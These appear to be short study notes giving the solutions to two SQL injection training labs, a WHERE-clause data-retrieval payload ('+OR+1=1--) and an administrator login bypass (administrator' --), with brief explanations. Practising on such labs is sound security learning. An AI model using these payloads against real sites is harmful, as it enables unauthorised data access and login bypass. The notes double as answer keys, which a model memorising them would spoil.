1st Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Answer: GET /filter?category='+OR+1=1-- HTTP/2
why we used OR 1=1 is becase F OR T == T

2nd Lab: SQL injection vulnerability allowing login bypass

input: administrator' --   
password: any password
The usage of '--' is to ignore the rest of the Query
